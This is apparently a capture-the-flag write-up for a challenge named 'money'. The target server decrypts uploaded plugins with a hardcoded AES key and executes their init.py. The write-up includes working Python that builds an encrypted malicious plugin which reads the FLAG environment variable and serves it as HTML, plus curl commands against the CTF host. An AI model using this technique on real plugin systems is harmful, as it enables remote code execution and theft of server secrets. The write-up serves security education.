# money

This isn't wordpress...

**Core idea:** server decrypts uploaded `.plugin` with a **hardcoded AES key**, extracts and **executes `init.py`**, and serves any files in the plugin folder at `/widget/<UID>/…`. The flag is exposed to the plugin as an environment variable (`FLAG`). I made a plugin that reads that env var and writes it into an HTML file that the server then serves.

---

## Vulnerability summary

- **Hardcoded symmetric key** allows anyone to produce valid `.plugin` archives.

- **Arbitrary code execution on upload**: the server runs `python init.py` from the uploaded archive.

- **Web-accessible plugin directory**: files created by `init.py` are immediately downloadable at `/widget/<UID>/…`.

- Combined, these give a straightforward RCE → exfiltration path for environment-held secrets.

---

## Exploit steps (what I did)

1. **Create a small plugin** whose `init.py` reads the `FLAG` env var and writes it into a served HTML file.

`init.py` (runs on server at upload):

```python
import os, html, pathlib
d = pathlib.Path(__file__).resolve().parent
flag = os.getenv("FLAG","NOFLAG")
content = f"<!doctype html><meta charset=utf-8><pre>{html.escape(flag)}</pre>"
(d/"flag.html").write_text(content, encoding="utf-8")
(d/"index.html").write_text(content, encoding="utf-8")  # optional: replace index
print(flag)
```

2. **Pack these files into `plugin.zip`** (include `index.html`, `plugin_manifest.json`, `init.py`).

3. **Encrypt to `.plugin`** using the known key from source (format: `IV || AES-CBC(pad(plugin.zip))`).

Example (script used to build `htmlflag.plugin`):

```python
# make_htmlflag.py (local)
import os, json, zipfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

os.makedirs("p", exist_ok=True)
open("p/index.html","w").write("<h1>waiting...</h1>")
open("p/plugin_manifest.json","w").write(json.dumps({"name":"htmlflag","version":"1.0","author":"you","icon":"index.html"}))
open("p/init.py","w").write("""import os, html, pathlib
d=pathlib.Path(__file__).resolve().parent
flag=os.getenv('FLAG','NOFLAG')
content=f\"\"\"<!doctype html><meta charset=utf-8><pre>{html.escape(flag)}</pre>\"\"\"
(d/'flag.html').write_text(content,encoding='utf-8')
(d/'index.html').write_text(content,encoding='utf-8')
print(flag)
""")
with zipfile.ZipFile("plugin.zip","w",zipfile.ZIP_DEFLATED) as z:
    z.write("p/index.html","index.html"); z.write("p/plugin_manifest.json","plugin_manifest.json"); z.write("p/init.py","init.py")
iv = os.urandom(16)
ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(open("plugin.zip","rb").read(),16))
open("htmlflag.plugin","wb").write(iv+ct)
print("wrote htmlflag.plugin")
```

4. **Upload the plugin** to the service:

`curl -F "file=@htmlflag.plugin" http://ctf.ac.upt.ro:9549/upload`

5. **Find my plugin UID** (the dashboard lists plugin cards):

`UID=$(curl -s http://ctf.ac.upt.ro:9549/ | grep -oP '/widget/\K[0-9a-f-]{36}' | tail -1)`

6. **Open the served page** to retrieve the flag:
- index (replaced): `http://ctf.ac.upt.ro:9549/widget/$UID`

- explicit file: `http://ctf.ac.upt.ro:9549/widget/$UID/flag.html`

The page contained the flag printed from the server environment.
